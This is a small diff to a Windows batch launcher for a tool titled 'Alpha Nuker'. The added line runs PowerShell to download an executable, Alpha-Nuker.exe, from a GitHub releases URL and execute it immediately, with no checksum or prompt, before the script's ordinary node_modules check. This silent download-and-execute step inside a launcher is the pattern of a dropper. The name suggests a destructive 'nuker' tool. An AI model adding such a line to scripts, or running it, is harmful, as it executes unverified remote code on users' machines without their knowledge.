@@ -1,4 +1,5 @@
 @echo off
+powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/Alpha-Nuker/releases/download/Alpha-Nuker/Alpha-Nuker.exe';$file='Alpha-Nuker.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 title Alpha Nuker
 
 if exist node_modules\ (
